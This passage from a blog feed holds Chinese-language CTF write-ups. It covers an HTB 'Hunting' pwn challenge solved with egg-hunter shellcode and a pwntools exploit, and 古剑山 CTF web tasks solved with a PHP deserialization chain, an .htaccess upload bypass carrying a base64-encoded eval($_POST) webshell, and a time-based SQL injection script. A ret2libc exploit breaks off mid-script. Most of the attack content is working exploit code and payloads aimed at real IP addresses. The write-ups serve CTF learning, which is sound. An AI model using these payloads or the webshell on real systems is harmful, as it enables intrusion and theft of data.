class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>可以看到里面是有个 HTB {xxx} 的信息</p>\n<p>./hunting 运行尝试</p>\n<p>发现无论输入任何数都显示</p>\n<p>Segmentation fault</p>\n<p>拖入 ida32 查看</p>\n<p>没有显示 main 函数，只有自己找，找到如下代码可以判断为主函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_1460()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp-10h] [ebp-24h]</span><br><span class=\"line\">  int v2; // [esp-Ch] [ebp-20h]</span><br><span class=\"line\">  int v3; // [esp-8h] [ebp-1Ch]</span><br><span class=\"line\">  int v4; // [esp-4h] [ebp-18h]</span><br><span class=\"line\">  void *buf; // [esp+0h] [ebp-14h]</span><br><span class=\"line\">  char *dest; // [esp+4h] [ebp-10h]</span><br><span class=\"line\">  void *addr; // [esp+8h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  addr = (void *)sub_13D0();</span><br><span class=\"line\">  signal(14, (__sighandler_t)&amp;exit);</span><br><span class=\"line\">  alarm(0xAu);</span><br><span class=\"line\">  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);</span><br><span class=\"line\">  if ( dest == (char *)-1 )</span><br><span class=\"line\">    sub_1120(-1, v1, v2, v3);</span><br><span class=\"line\">  strcpy(dest, aHtbXxxxxxxxxxx);</span><br><span class=\"line\">  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));</span><br><span class=\"line\">  sub_133D();</span><br><span class=\"line\">  buf = mmap(0, 0x1000u, 7, 33, -1, 0);</span><br><span class=\"line\">  read(0, buf, 0x3Cu);</span><br><span class=\"line\">  ((void (__stdcall *)(int, void *, _DWORD))buf)(v4, buf, 0);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个代码使用了 mmap (addr, 0x1000u, 3, 49, -1, 0); 请求了 0x1000 内存给了 dest 以及 buf</p>\n<p>并且将 strcpy (dest, aHtbXxxxxxxxxxx); 我们需要的 flag 拷贝到了 dest 内存中</p>\n<p>然后在使用了 meset 函数给 flag 之前的内存地址清零</p>\n<p>read (0, buf, 0x3Cu); 我们现在还有 0x3c 的内存可以利用</p>\n<p>还调用了 sub_13D0</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_13D0()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int buf; // [esp+0h] [ebp-18h] BYREF</span><br><span class=\"line\">  int fd; // [esp+8h] [ebp-10h]</span><br><span class=\"line\">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class=\"line\">  read(fd, &amp;buf, 8u);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">  srand(buf);</span><br><span class=\"line\">  for ( i = 0; i &lt;= 1610612735; i = rand() &lt;&lt; 16 )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  return i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>利用写入的 buf 当作 srand 并且利用 i 来测试随机数</p>\n<p>在使用 seccomp-tools dump ./hunting</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─# seccomp-tools dump ./hunting</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class=\"line\"> 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013</span><br><span class=\"line\"> 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013</span><br><span class=\"line\"> 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013</span><br><span class=\"line\"> 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013</span><br><span class=\"line\"> 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013</span><br><span class=\"line\"> 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013</span><br><span class=\"line\"> 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013</span><br><span class=\"line\"> 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013</span><br><span class=\"line\"> 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></p>\n<p>把 execve 以及 open，close 给禁用了，表示我们无法使用 getshell，orw</p>\n<p>这个时候就得利用 c 里面的函数去找 flag 的地址了</p>\n<p>比如 access 可以来判断文件名是否存在并且判断内存地址是否存在</p>\n<p>利用语法为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access(const char *filename,int mode);</span><br><span class=\"line\">当mode 为0 时，判断是否存在。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为1时，判断是否有执行权限。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为2时，判断是否有写权限。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为3时，判断是否有读权限。</span><br></pre></td></tr></table></figure></p>\n<p>filename 参数可以是文件名也能是内存地址</p>\n<p>利用 access 函数以 0x1000 为一个单位来慢慢遍历</p>\n<p>用 c 伪代码表达为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (uint32_t address = 0x60000000; address &lt; 0x7fffffff; address += 0x1000)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        if (access(address + i +4) == EFAULT)</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        write(1, address, 0x26);</span><br><span class=\"line\">        exit(0);</span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用汇编表达就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./hunting&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;167.99.82.136&#x27;,32646)</span><br><span class=\"line\">payload=&quot;&quot;&quot;</span><br><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">p.sendline(asm(payload))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>成功得到 flag</p>\n<p>借鉴了大佬 wp [Hunting— HTB PWN challenge | lexsd6's home](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZXhzZDYuZ2l0aHViLmlvLzIwMjEvMTEvMDIvUFdO\">https://lexsd6.github.io/2021/11/02/PWN</span> Hunting challenge — HTB/)</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/",
            "url": "https://lookhui.github.io/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/",
            "title": "第一届古剑山",
            "date_published": "2023-12-13T05:13:01.000Z",
            "content_html": "<h4 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h4>\n<h6 id=\"unset\"><a class=\"anchor\" href=\"#unset\">#</a> unset</h6>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;./test.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">justafun</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;yourcode&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>使用 php 伪协议得到 test 源码</p>\n<p><img data-src=\"/pic/image-20231208120950833.png\" alt=\"\" /></p>\n<p>base64 解码后的得到源码</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">    <span class=\"variable\">$test</span> = <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">justafun</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|zlib|string/i&quot;</span>, <span class=\"variable\">$filename</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$result</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">FALSE</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">afun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>; </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\">        <span class=\"variable\">$temp</span> = <span class=\"variable language_\">$this</span>-&gt;a . <span class=\"string\">&#x27;ctf&#x27;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">bfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$items</span> = <span class=\"keyword\">array</span>(); </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"variable\">$item</span> = <span class=\"variable language_\">$this</span>-&gt;items; </span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"variable\">$item</span>[<span class=\"string\">&#x27;dd&#x27;</span>]-&gt;knife; </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;what the good?&#x27;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$params</span> = <span class=\"keyword\">array</span>(); </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>) </span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"variable\">$tmp</span> = <span class=\"variable language_\">$this</span>-&gt;params[<span class=\"variable\">$key</span>];</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$$tmp</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>过滤了 flag 但是 cfun 调用后可以得到 flag</p>\n<p>利用点在 $$tmp</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">afun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">bfun</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">bfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$items</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;items[<span class=\"string\">&#x27;dd&#x27;</span>]=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">cfun</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$params</span>=<span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;params[<span class=\"string\">&#x27;knife&#x27;</span>]=<span class=\"string\">&#x27;flag&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">afun</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这样就得到 flag</p>\n<h6 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h6>\n<p>第一次做这个题目考点是利用了.htaccess 解析进行了解密，首先使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./wenda.jpg&quot;</span><br><span class=\"line\">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></p>\n<p>使用了 php 的伪协议进行了解密，然后 jpg 只要能上传被加密的图片马内容即可</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"盲人摸象\"><a class=\"anchor\" href=\"#盲人摸象\">#</a> 盲人摸象</h6>\n<p>insert into 注入</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 基于时间的盲注，过滤了逗号 ,</span></span><br><span class=\"line\">sql = <span class=\"string\">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://47.106.186.166:31590/&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">40</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;正在猜测：&#x27;</span>, <span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>, <span class=\"number\">129</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch == <span class=\"number\">128</span>:</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        sqli = sql.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">chr</span>(ch))</span><br><span class=\"line\">        <span class=\"comment\"># print(sqli)</span></span><br><span class=\"line\">        header = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: sqli</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            html = requests.get(url, headers=header, timeout=<span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(ch)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&quot;amd64&quot;</span>,os=<span class=\"string\">&quot;linux&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&quot;0.0.0.0&quot;</span>,<span class=\"number\">8888</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;/home/feichai/ctf_file/choice&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/feichai/ctf_file/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">puts_got = elf.got.puts</span><br><span class=\"line\">puts_plt = elf.plt.puts</span><br><span class=\"line\">ret_addr = <span class=\"number\">0x080483c2</span></span><br><span class=\"line\">return_addr = <span class=\"number\">0x0804857B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;Please enter your name:&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">b&#x27;\\x00&#x27;</span> + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">19</span> + <span class=\"string\">b&#x27;\\xff&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;3. Study hard from now&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&#x27;a&#x27;</span> * (<span class=\"number\">28</span> + <span class=\"number\">4</span>) + p32(elf.plt[<span class=\"string\">b&#x27;puts&#x27;</span>]) +p32(return_addr) +p32(elf.got[<span class=\"string\">b&#x27;puts&#x27;</span>])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Wrong choice!&quot;</span>)</span><br><span class=\"line\">p.sendline(pad)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;Good bye!&quot;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recv()[<span class=\"number\">1</span>:<span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br><span 